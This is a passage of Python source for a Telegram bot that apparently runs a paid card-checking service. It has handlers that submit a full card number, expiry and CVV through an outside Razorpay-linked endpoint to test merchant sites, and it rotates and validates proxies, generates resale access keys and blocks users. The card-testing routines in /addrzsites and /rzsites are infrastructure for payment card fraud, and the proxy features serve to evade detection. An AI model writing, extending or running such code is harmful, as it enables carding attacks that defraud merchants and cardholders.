        res = await test_site(site, proxy)
        if res['status'] == 'alive':
            added.append(site)
        else:
            failed.append(site)
    if added:
        async with aiofiles.open(SITES_FILE, 'a') as f:
            for s in added:
                await f.write(f"{s}\n")
    total = len(load_sites())
    await status_msg.edit(premium_emoji(f"""✅ Bulk Add Complete
✅ Added: <code>{len(added)}</code>
❗ Failed: <code>{len(failed)}</code>
📊 Total Sites: <code>{total}</code>"""), parse_mode="html")

# ---- /rm (single site removal) ----
@bot.on(events.NewMessage(pattern=r'^/rm\s+(.+)'))
async def remove_user_site_cmd(event):
    user_id = event.sender_id
    site_to_remove = event.pattern_match.group(1).strip()
    if not site_to_remove.startswith("http"):
        site_to_remove = f"https://{site_to_remove}"
    user_sites = get_user_sites_sync(user_id)
    if not user_sites:
        await event.reply(premium_emoji("❗ No sites in your list!\nUse /addsite url to add."), parse_mode="html")
        return
    found = None
    for s in user_sites:
        if site_to_remove in s or s in site_to_remove:
            found = s
            break
    target = found if found else site_to_remove
    if target not in user_sites:
        await event.reply(premium_emoji("❗ Site not found!\n\nUse /mysites to view your sites."), parse_mode="html")
        return
    await remove_user_site(user_id, target)
    remaining = len(get_user_sites_sync(user_id))
    await event.reply(premium_emoji(f"""✅ Site Removed!
🗑 <code>{target[:50]}</code>
📊 Remaining: <code>{remaining}</code>
💠 /addsite url | /mysites"""), parse_mode="html")

# ---- /mysites ----
@bot.on(events.NewMessage(pattern=r'^/mysites$'))
async def my_sites_cmd(event):
    user_id = event.sender_id
    sites = get_user_sites_sync(user_id)
    if not sites:
        await event.reply(premium_emoji("❗ No sites added yet.\nUse /addsite url to add."), parse_mode="html")
        return
    site_list = "\n".join([f"• <code>{s}</code>" for s in sites])
    await event.reply(premium_emoji(f"""📋 **Your Sites ({len(sites)})**
━━━━━━━━━━━━━━━━━━━━
{site_list}
━━━━━━━━━━━━━━━━━━━━
💠 /rm url - Remove | /clearsites - Clear all"""), parse_mode="html")

# ---- /clearsites ----
@bot.on(events.NewMessage(pattern=r'^/clearsites$'))
async def clear_user_sites_cmd(event):
    user_id = event.sender_id
    user_sites = get_user_sites_sync(user_id)
    if not user_sites:
        await event.reply(premium_emoji("❗ No sites to clear!"), parse_mode="html")
        return
    count = len(user_sites)
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    backup_file = f"sites_backup_{user_id}_{timestamp}.txt"
    with open(backup_file, "w") as f:
        for s in user_sites:
            f.write(f"{s}\n")
    await clear_user_sites(user_id)
    await event.reply(premium_emoji(f"✅ Cleared {count} sites! Backup attached."), file=backup_file)
    try: os.remove(backup_file)
    except: pass

# ---- /addrzsites ----
@bot.on(events.NewMessage(pattern=r'^/addrzsites\s+(.+)'))
async def add_razorpay_site(event):
    user_id = event.sender_id
    site = event.pattern_match.group(1).strip()
    if not site.startswith("http"):
        site = f"https://{site}"
    status_msg = await event.reply(premium_emoji(f"🔄 Testing Razorpay Site...\n\n<code>{site[:60]}</code>"), parse_mode="html")
    proxies = load_proxies()
    if not proxies:
        await status_msg.edit(premium_emoji("/addproxy add your proxy | ❗ No proxies available!"))
        return
    proxy = random.choice(proxies)
    test_card = "5154623245618097|03|2032|156"
    try:
        base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount=1&cc={test_card}"
        timeout = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(base_url, ssl=False) as resp:
                raw_text = await resp.text()
                if not raw_text or len(raw_text) < 10:
                    await status_msg.edit(premium_emoji("❗ RZ Site Dead! Empty Response."), parse_mode="html")
                    return
                try:
                    raw = json.loads(raw_text)
                except:
                    await status_msg.edit(premium_emoji("❗ RZ Site Dead! Invalid Response."), parse_mode="html")
                    return
                response_msg = str(raw.get('response', raw.get('Response', ''))).lower()
                dead_indicators = ['error', 'invalid', 'dead', 'failed', 'timeout', 'not found', 'bad gateway', 'cloudflare', 'captcha', 'connection', 'refused']
                if any(x in response_msg for x in dead_indicators):
                    await status_msg.edit(premium_emoji(f"❗ RZ Site Dead!\n\n<code>{site[:60]}</code>"), parse_mode="html")
                    return
                current_rz = get_file_lines(RZ_SITES_FILE)
                if site not in current_rz:
                    async with aiofiles.open(RZ_SITES_FILE, 'a') as f:
                        await f.write(f"{site}\n")
                    await status_msg.edit(premium_emoji(f"""✅ Razorpay Site Added!
📊 Total RZ Sites: <code>{len(current_rz) + 1}</code>
💠 /rzsites - Check | /rmrzsites url - Remove"""), parse_mode="html")
                else:
                    await status_msg.edit(premium_emoji("⚠️ Already in RZ list!"), parse_mode="html")
    except:
        await status_msg.edit(premium_emoji("❗ Test Failed! Not Added."), parse_mode="html")

# ---- /rmrzsites ----
@bot.on(events.NewMessage(pattern=r'^/rmrzsites\s+(.+)'))
async def remove_razorpay_site(event):
    user_id = event.sender_id
    site_to_remove = event.pattern_match.group(1).strip()
    if not site_to_remove.startswith("http"):
        site_to_remove = f"https://{site_to_remove}"
    current_rz = get_file_lines(RZ_SITES_FILE)
    if not current_rz:
        await event.reply(premium_emoji("❗ No Razorpay sites found!\nUse /addrzsites url to add."), parse_mode="html")
        return
    found = None
    for s in current_rz:
        if site_to_remove in s or s in site_to_remove:
            found = s
            break
    target = found if found else site_to_remove
    if target not in current_rz:
        await event.reply(premium_emoji("❗ Site not found in RZ list!\n\nUse /rzsites to view all."), parse_mode="html")
        return
    new_rz = [s for s in current_rz if s != target]
    async with aiofiles.open(RZ_SITES_FILE, 'w') as f:
        for s in new_rz:
            await f.write(f"{s}\n")
    await event.reply(premium_emoji(f"""✅ Razorpay Site Removed!
🗑 <code>{target[:50]}</code>
📊 Remaining: <code>{len(new_rz)}</code>
💠 /addrzsites url | /rzsites"""), parse_mode="html")

# ---- /rzsites ----
@bot.on(events.NewMessage(pattern=r'^/rzsites$'))
async def rz_sites_check(event):
    user_id = event.sender_id
    sites = get_file_lines(RZ_SITES_FILE)
    proxies = load_proxies()
    if not sites:
        await event.reply(premium_emoji("❗ No Razorpay sites in rz_sites.txt\nUse /addrzsites url to add."))
        return
    if not proxies:
        await event.reply(premium_emoji("❗ No proxies."))
        return
    msg = await event.reply(premium_emoji(f"""<b>⚡ RZ Site Checker</b>
📊 Total Sites: <code>{len(sites)}</code>
🔄 Testing with Razorpay API...
"""), parse_mode="html")
    alive = []
    dead = []
    checked = 0
    test_card = "5154623245618097|03|2032|156"
    for site in sites:
        checked += 1
        proxy = random.choice(proxies)
        try:
            base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount=1&cc={test_card}"
            timeout = aiohttp.ClientTimeout(total=20)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(base_url, ssl=False) as resp:
                    raw_text = await resp.text()
                    if not raw_text or len(raw_text) < 10:
                        dead.append(site)
                        continue
                    try:
                        raw = json.loads(raw_text)
                    except:
                        dead.append(site)
                        continue
                    response_msg = str(raw.get('response', raw.get('Response', ''))).lower()
                    dead_indicators = ['error', 'invalid', 'dead', 'failed', 'timeout', 'not found', 'bad gateway', 'cloudflare', 'captcha', 'site not supported', 'connection', 'refused']
                    if any(x in response_msg for x in dead_indicators):
                        dead.append(site)
                    else:
                        alive.append(site)
        except:
            dead.append(site)
        if checked % 5 == 0 or checked == len(sites):
            try:
                await msg.edit(premium_emoji(f"""<b>⚡ RZ Site Checker</b>
📊 Total: <code>{len(sites)}</code>
✅ Working: <code>{len(alive)}</code>
❗ Dead: <code>{len(dead)}</code>
🔄 Checked: <code>{checked}/{len(sites)}</code>"""), parse_mode="html")
            except: pass
    if alive:
        txt_file = "working_rz_sites.txt"
        with open(txt_file, "w") as f:
            for s in alive:
                if not s.startswith("http"):
                    s = "https://" + s
                f.write(s + "\n")
        await bot.send_message(user_id, f"📄 **{len(alive)} Working RZ Sites**", file=txt_file)
        os.remove(txt_file)
    await msg.edit(premium_emoji(f"""<b>✅ RZ Site Check Complete</b>
📊 Total: <code>{len(sites)}</code>
✅ Working: <code>{len(alive)}</code>
❗ Dead: <code>{len(dead)}</code>
📄 TXT File Sent ✅"""), parse_mode="html")

# ---- PROXY COMMANDS ----
@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_proxies(event):
    user_id = event.sender_id
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❗ No proxies in your list."))
        return
    if len(proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await event.reply(premium_emoji(f"📋 **Your Proxies ({len(proxies)}):**\n\n{proxy_list}"), parse_mode="html")
    else:
        timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        with open(filename, "w") as f:
            for proxy in proxies:
                f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"📋 **Your Proxies ({len(proxies)}):**"), file=filename)
        try: os.remove(filename)
        except: pass

@bot.on(events.NewMessage(pattern=r'^/myproxies$'))
async def view_user_proxies(event):
    user_id = event.sender_id
    proxies = load_proxies()
    if not proxies:
        await event.reply("📭 **No proxies in your list.**\n\nUse `/addproxy ip:port` to add.")
        return
    proxy_list = "\n".join([f"{i+1}. `{p}`" for i, p in enumerate(proxies)])
    await event.reply(f"📋 **Your Proxies ({len(proxies)}):**\n\n{proxy_list}")

@bot.on(events.NewMessage(pattern=r'^/addproxy(?:\s|\n|$)([\s\S]*)'))
async def add_user_proxy_cmd(event):
    user_id = event.sender_id
    proxy_input = event.pattern_match.group(1).strip()
    if not proxy_input:
        await event.reply(premium_emoji("""📋 <b>CORRECT FORMATS:</b>
✅ <code>ip:port</code>
✅ <code>user:pass@host:port</code>
✅ <code>host:port:user:pass</code>
✅ <code>socks5://ip:port</code>
✅ <code>socks4://ip:port</code>
<b>Multiple proxies:</b> Space ya Newline se separate karein"""), parse_mode="html")
        return
    proxies_raw = []
    for line in proxy_input.splitlines():
        for p in line.split():
            p = p.strip()
            if p and p not in proxies_raw:
                proxies_raw.append(p)
    if not proxies_raw:
        await event.reply(premium_emoji("❗ No proxy found."))
        return
    formatted_proxies = []
    invalid_proxies = []
    for proxy in proxies_raw:
        proxy = proxy.strip()
        if ":" in proxy and len(proxy.split(":")) >= 2:
            formatted_proxies.append(proxy)
        else:
            invalid_proxies.append(proxy)
    if invalid_proxies:
        await event.reply(f"⚠️ {len(invalid_proxies)} invalid format skipped.")
        if not formatted_proxies:
            return
    if not formatted_proxies:
        await event.reply("❗ No valid proxies.")
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Checking {len(formatted_proxies)} proxies..."), parse_mode="html")
    existing = await get_user_proxies_sync(user_id)
    new_proxies = [p for p in formatted_proxies if p not in existing]
    skipped = len(formatted_proxies) - len(new_proxies)
    added = 0
    dead = 0
    checked = 0
    total = len(new_proxies)
    start_time = time.time()
    last_update_time = time.time()
    async def update_status():
        nonlocal last_update_time
        while checked < total:
            elapsed = round(time.time() - start_time, 1)
            if time.time() - last_update_time >= 30:
                last_update_time = time.time()
                try:
                    await status_msg.edit(premium_emoji(f"""
<b>🔄 PROXY CHECK IN PROGRESS...</b>
━━━━━━━━━━━━━━━━━━━━
✅ Working: <code>{added}</code>
❗ Dead: <code>{dead}</code>
📊 Progress: <code>{checked}/{total}</code>
⏱️ Time: <code>{elapsed}s</code>
━━━━━━━━━━━━━━━━━━━━
⚡ Checking...
"""), parse_mode="html")
                except:
                    pass
            await asyncio.sleep(2)
    update_task = asyncio.create_task(update_status())
    if new_proxies:
        for i in range(0, len(new_proxies), 10):
            batch = new_proxies[i:i+10]
            tasks = [check_proxy(p) for p in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for proxy, is_alive in zip(batch, results):
                checked += 1
                if isinstance(is_alive, dict) and is_alive.get('alive'):
                    await add_user_proxy(user_id, proxy)
                    added += 1
                else:
                    dead += 1
    update_task.cancel()
    total_proxies = len(await get_user_proxies_sync(user_id))
    final_time = round(time.time() - start_time, 2)
    await status_msg.edit(premium_emoji(f"""
✅ PROXY CHECK COMPLETE
━━━━━━━━━━━━━━━━━━━━
📥 Input: <code>{len(proxies_raw)}</code>
⚠️ Invalid Format: <code>{len(invalid_proxies)}</code>
━━━━━━━━━━━━━━━━━━━━
✅ Alive Added: <code>{added}</code>
❗ Dead: <code>{dead}</code>
⏭ Already Exist: <code>{skipped}</code>
━━━━━━━━━━━━━━━━━━━━
📊 Total Your Proxies: <code>{total_proxies}</code>
⏱️ Time Taken: <code>{final_time}s</code>
━━━━━━━━━━━━━━━━━━━━
💠 /proxy - Check all
💠 /getproxy - View all
"""), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❗ **Access Denied**\n\nOnly admins can use this command."))
        return
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❗ Usage: `/rmproxy ip:port`"))
        return
    current = load_proxies()
    if proxy_to_remove not in current:
        await event.reply(premium_emoji(f"❗ Proxy not found: `{proxy_to_remove}`"))
        return
    new_proxies = [p for p in current if p != proxy_to_remove]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in new_proxies:
            await f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ **Proxy Removed!**\n\n`{proxy_to_remove}`\n📊 Remaining: `{len(new_proxies)}`"), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/rmmyproxy\s+(.+)'))
async def remove_user_proxy_cmd(event):
    user_id = event.sender_id
    proxy = event.pattern_match.group(1).strip()
    if await remove_user_proxy(user_id, proxy):
        await event.reply(f"✅ **Proxy removed!**\n\n`{proxy}`")
    else:
        await event.reply("❗ Proxy not found in your list.")

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❗ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return
    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❗ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return
    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❗ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return
    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❗ No proxies in proxy.txt"), parse_mode='html')
        return
    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)
    if not removed:
        await event.reply(premium_emoji("❗ No valid indices found."), parse_mode='html')
        return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_proxies(event):
    user_id = event.sender_id
    proxies = load_proxies()
    count = len(proxies)
    if count == 0:
        await event.reply(premium_emoji("❗ Your proxy list is already empty."))
        return
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    backup_file = f"proxy_backup_{user_id}_{timestamp}.txt"
    with open(backup_file, "w") as f:
        f.write("\n".join(proxies))
    await bot.send_message(user_id, f"📶 **Backup Created!** {count} proxies saved.", file=backup_file)
    try: os.remove(backup_file)
    except: pass
    data = await load_user_proxies()
    if str(user_id) in data:
        del data[str(user_id)]
        await save_user_proxies(data)
    await event.reply(premium_emoji(f"""✅ **Your Proxies Cleared!**
🗑 Cleared: <code>{count}</code> proxies
📶 Backup: Sent above
📊 Your list is now empty.
💠 Use `/addproxy` to add new proxies manually.
💠 Use `/savetxt` to add via TXT file."""), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/savetxt$'))
async def add_proxy_from_txt(event):
    user_id = event.sender_id
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❗ Reply to a .txt file containing proxies."))
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.document or not reply_msg.document.mime_type == 'text/plain':
        await event.reply(premium_emoji("❗ Please reply to a .txt file."))
        return
    file_size = reply_msg.document.size
    if file_size > 5 * 1024 * 1024:
        await event.reply(premium_emoji("❗ File too large! Max 5MB allowed for proxy checking."))
        return
    status_msg = await event.reply(premium_emoji("📲 Reading proxies from TXT file..."))
    try:
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        try: 
            os.remove(file_path)
        except: 
            pass
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❗ Error reading file: {str(e)}"))
        return
    proxies_to_add = list(dict.fromkeys(line.strip() for line in content.splitlines() if line.strip()))
    if not proxies_to_add:
        await status_msg.edit(premium_emoji("❗ No valid proxies found in file."))
        return
    if len(proxies_to_add) > 1000:
        await status_msg.edit(premium_emoji(f"⚠️ Too many proxies ({len(proxies_to_add)}). Checking first 1000 only..."))
        proxies_to_add = proxies_to_add[:1000]
    await status_msg.edit(premium_emoji(f"🔄 REAL CHECKING {len(proxies_to_add)} proxies..."))
    existing = await get_user_proxies_sync(user_id)
    added = 0
    dead = 0
    new_proxies = [p for p in proxies_to_add if p not in existing]
    skipped = len(proxies_to_add) - len(new_proxies)
    batch_size = 10
    for i in range(0, len(new_proxies), batch_size):
        batch = new_proxies[i:i + batch_size]
        if i > 0:
            await status_msg.edit(premium_emoji(f"🔄 Checking {i}/{len(new_proxies)} proxies... (✅ {added} alive | ❗ {dead} dead)"))
        results = await asyncio.gather(*[check_proxy(p) for p in batch], return_exceptions=True)
        for proxy, is_alive in zip(batch, results):
            if isinstance(is_alive, dict) and is_alive.get('alive'):
                await add_user_proxy(user_id, proxy)
                added += 1
            else:
                dead += 1
    total = len(await get_user_proxies_sync(user_id))
    final_msg = f"""
<b>✅ TXT PROXY CHECK COMPLETE</b>
━━━━━━━━━━━━━━━━━━━━
📄 Total in file: <code>{len(proxies_to_add)}</code>
✅ Alive Added: <code>{added}</code>
❗ Dead: <code>{dead}</code>
⏭ Already Exist: <code>{skipped}</code>
━━━━━━━━━━━━━━━━━━━━
📊 Total Your Proxies: <code>{total}</code>
"""
    await status_msg.edit(premium_emoji(final_msg), parse_mode="html")

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("""❗ **No proxies in your list!**
📌 Add proxies first:
<code>/addproxy ip:port</code>
<code>/savetxt</code> (reply to .txt file)
📋 View your proxies:
<code>/myproxies</code>"""), parse_mode="html")
        return
    status_msg = await event.reply(premium_emoji(f"⚡ Checking {len(proxies)} proxies..."))
    alive_proxies = []
    dead_proxies = []
    total = len(proxies)
    checked = 0
    for proxy in proxies:
        alive = await check_proxy(proxy)
        if alive.get('alive'):
            alive_proxies.append(proxy)
        else:
            dead_proxies.append(proxy)
        checked += 1
        if checked % 5 == 0 or checked == total:
            await status_msg.edit(premium_emoji(f"""⚡ Checking...
✅ Working: <code>{len(alive_proxies)}</code>
❗ Dead: <code>{len(dead_proxies)}</code>
📊 Progress: <code>{checked}/{total}</code>"""), parse_mode="html")
    try:
        if os.path.exists(USER_PROXY_FILE):
            with open(USER_PROXY_FILE, 'r', encoding='utf-8') as f:
                all_data = json.load(f)
        else:
            all_data = {}
        all_data[str(user_id)] = alive_proxies
        with open(USER_PROXY_FILE, 'w', encoding='utf-8') as f:
            json.dump(all_data, f, indent=4)
    except Exception as e:
        print(f"❗ Save error: {e}")
        data = await load_user_proxies()
        data[str(user_id)] = alive_proxies
        await save_user_proxies(data)
    if alive_proxies:
        txt_file = f"working_proxies_{user_id}.txt"
        with open(txt_file, "w") as f:
            f.write("\n".join(alive_proxies))
        await bot.send_message(user_id, f"📄 **{len(alive_proxies)} Working Proxies**", file=txt_file)
        try: os.remove(txt_file)
        except: pass
    await status_msg.edit(premium_emoji(f"""✅ **Proxy Check Complete!**
✅ Working: <code>{len(alive_proxies)}</code>
❗ Removed: <code>{len(dead_proxies)}</code>
📊 Total: <code>{total}</code>
📄 TXT Sent ✅
⚡ <b>Your proxy list updated — Dead removed, Alive kept!</b>"""), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❗ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return
    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❗ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
    try:
        result = await check_proxy(proxy)
        if result.get('alive'):
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❗ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❗ Error checking proxy: {e}"), parse_mode='html')

# ---- BLOCK/UNBLOCK ----
@bot.on(events.NewMessage(pattern=r'^/block\s+(\d+)'))
async def block_user_cmd(event):
    user_id = event.sender_id
    if user_id not in KEY_ADMINS:
        await event.reply(premium_emoji("<b>❗ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ</b>"), parse_mode="html")
        return
    try:
        target_id = int(event.pattern_match.group(1))
    except:
        await event.reply(premium_emoji("<b>❗ ᴜꜱᴀɢᴇ:</b> <code>/block USER_ID</code>"), parse_mode="html")
        return
    if target_id == user_id:
        await event.reply(premium_emoji("<b>❗ ᴀᴘɴᴇ ᴀᴘ ᴋᴏ ʙʟᴏᴄᴋ ɴᴀʜɪ ᴋᴀʀ sᴀᴋᴛᴇ! 😆</b>"), parse_mode="html")
        return
    if target_id in KEY_ADMINS:
        await event.reply(premium_emoji("<b>❗ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ</b>"), parse_mode="html")
        return
    if is_blocked(target_id):
        await event.reply(premium_emoji(f"<b>⚠️ ᴜꜱᴇʀ <code>{target_id}</code> ᴘᴇʜʟᴇ sᴇ ʙʟᴏᴄᴋᴇᴅ ʜᴀɪ!</b>"), parse_mode="html")
        return
    block_user(target_id)
    await event.reply(premium_emoji(f"""<b>🚫 ᴜꜱᴇʀ sᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʙʟᴏᴄᴋᴇᴅ! 🚫</b>
━━━━━━━━━━━━━━━━━━━━
<b>🆔 ᴜꜱᴇʀ ɪᴅ:</b> <code>{target_id}</code>
━━━━━━━━━━━━━━━━━━━━
<b>💠 ᴜɴʙʟᴏᴄᴋ:</b> <code>/unblock {target_id}</code>"""), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/unblock\s+(\d+)'))
async def unblock_user_cmd(event):
    user_id = event.sender_id
    if user_id not in KEY_ADMINS:
        await event.reply(premium_emoji("<b>❗ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ</b>"), parse_mode="html")
        return
    try:
        target_id = int(event.pattern_match.group(1))
    except:
        await event.reply(premium_emoji("<b>❗ ᴜꜱᴀɢᴇ:</b> <code>/unblock USER_ID</code>"), parse_mode="html")
        return
    if not is_blocked(target_id):
        await event.reply(premium_emoji(f"<b>⚠️ ᴜꜱᴇʀ <code>{target_id}</code> ʙʟᴏᴄᴋᴇᴅ ɴᴀʜɪ ʜᴀɪ!</b>"), parse_mode="html")
        return
    unblock_user(target_id)
    await event.reply(premium_emoji(f"""<b>✅ ᴜꜱᴇʀ ᴜɴʙʟᴏᴄᴋᴇᴅ sᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ! ✅</b>
━━━━━━━━━━━━━━━━━━━━
<b>🆔 ᴜɴʙʟᴏᴄᴋᴇᴅ ɪᴅ:</b> <code>{target_id}</code>
━━━━━━━━━━━━━━━━━━━━
<b>📋 ᴜꜱᴇʀ ʟɪꜱᴛ:</b> <code>/blocklist</code>"""), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/blocklist$'))
async def block_list_cmd(event):
    user_id = event.sender_id
    if user_id not in KEY_ADMINS:
        await event.reply(premium_emoji("<b>❗ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ</b>"), parse_mode="html")
        return
    blocked = get_blocked_users()
    if not blocked:
        await event.reply(premium_emoji("<b>📋 ʙʟᴏᴄᴋᴇᴅ ʟɪꜱᴛ ɪꜱ ᴇᴍᴘᴛʏ!</b>"), parse_mode="html")
        return
    blocked_text = "\n".join([f"<code>{uid}</code>" for uid in blocked])
    msg = f"""<b>🚫 ʙʟᴏᴄᴋᴇᴅ ᴜꜱᴇʀꜱ ʟɪꜱᴛ 🚫</b>
━━━━━━━━━━━━━━━━━━━━
<b>📊 ᴛᴏᴛᴀʟ ʙʟᴏᴄᴋᴇᴅ:</b> {len(blocked)}
{blocked_text}
━━━━━━━━━━━━━━━━━━━━
<b>🔓 ᴜɴʙʟᴏᴄᴋ:</b> <code>/unblock USER_ID</code>"""
    await event.reply(premium_emoji(msg), parse_mode="html")

# ---- KEY GENERATION & REDEEM ----
@bot.on(events.NewMessage(pattern=r'^/key\s+(\d+)\s+(\d+)\s+(\d+)$'))
async def generate_key_cmd(event):
    if event.sender_id not in KEY_ADMINS:
        await event.reply(premium_emoji("<b>❗ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ.</b>"), parse_mode="html")
        return
    try:
        count = int(event.pattern_match.group(1))
        days = int(event.pattern_match.group(2))
        device_limit = int(event.pattern_match.group(3))
        if count < 1 or days < 1 or device_limit < 1:
            raise ValueError
    except:
        await event.reply(premium_emoji("""<b>❗ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ</b>
━━━━━━━━━━━━━━━━━━━━
<b>👤 ᴜꜱᴀɢᴇ:</b> <code>/key COUNT DAYS DEVICE_LIMIT</code>
<b>💡 ᴇxᴀᴍᴘʟᴇꜱ:</b>
<code>/key 1 4 20</code> ▸ 1 ᴋᴇʏ, 4 ᴅᴀʏs, 20 ᴜsᴇʀs
<code>/key 5 7 10</code> ▸ 5 ᴋᴇʏs, 7 ᴅᴀʏs, 10 ᴜsᴇʀs"""), parse_mode="html")
        return
    keys = []
    for _ in range(count):
        key = generate_multi_device_key(days, device_limit)
        keys.append(key)
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"Keys_{timestamp}.txt"
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("❗ KEYS GENERATED ❗\n")
        await f.write("=" * 30 + "\n")
        await f.write(f"Plan: Core Access\n")
        await f.write(f"Duration: {days}days\n")
        await f.write(f"Key Expiry: {days}days\n")
        await f.write(f"Max Users: {device_limit}\n")
        await f.write(f"Quantity: {count}\n")
        await f.write("=" * 30 + "\n\n")
        for i, key in enumerate(keys, 1):
            await f.write(f"{i}. {key}\n")
        await f.write("\n" + "=" * 30 + "\n")
        await f.write("Bot: @foritxshopi_bot\n")
        await f.write("Redeem: /redeem [key]\n")
    msg = f"""<b>ᴋᴇʏ ɢᴇɴᴇʀᴀᴛᴇᴅ</b>  ✅
━━━━━━━━━━━━━━━━
👑 <b>ᴘʟᴀɴ:</b> 🛠️ premium 
🔗 <b>ᴅᴜʀᴀᴛɪᴏɴ:</b> {days}days
✅ <b>ᴋᴇʏ ᴇxᴘɪʀʏ:</b> {days}days
❗ <b>ᴍᴀx ᴜꜱᴇʀꜱ:</b> {device_limit}
❗ <b>Qᴜᴀɴᴛɪᴛʏ:</b> {count}
━━━━━━━━━━━━━━━━"""
    for i, key in enumerate(keys, 1):
        msg += f"\n{i}. <code>{key}</code>"
    msg += f"""
━━━━━━━━━━━━━━━━
⚡ <b>Bot :</b> @foritxshopi_bot
✅ <b>Redeem :</b> <code>/redeem [key]</code>"""
    await bot.send_message(event.chat_id, premium_emoji(msg), file=filename, parse_mode="html")
    try: os.remove(filename)
    except: pass

@bot.on(events.NewMessage(pattern=r'^/keystats\s+(.+)'))
async def key_stats_cmd(event):
    if event.sender_id not in KEY_ADMINS:
        await event.reply(premium_emoji("<b>❗ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴅᴇɴɪᴇᴅ!</b>"), parse_mode="html")
        return
    key = event.pattern_match.group(1).strip()
    key_info = get_key_info(key)
    if not key_info:
        await event.reply(premium_emoji("<b>❗ ᴋᴇʏ ɴᴏᴛ ꜰᴏᴜɴᴅ!</b>"), parse_mode="html")
        return
    devices_used = key_info.get('used', 0)
    device_limit = key_info.get('limit', 0)
    days = key_info.get('days', 0)
    created = key_info.get('created', 'ᴜɴᴋɴᴏᴡɴ')
    users_list = key_info.get('users', [])
    progress = "🟢" * devices_used + "⚪" * (device_limit - devices_used)
    users_text = "\n".join([f"<code>{uid}</code>" for uid in users_list]) if users_list else "ɴᴏ ᴜꜱᴇʀs ʏᴇᴛ"
    msg = f"""<b>📊 ᴋᴇʏ sᴛᴀᴛɪsᴛɪᴄs 📊</b>
━━━━━━━━━━━━━━━━━━━━
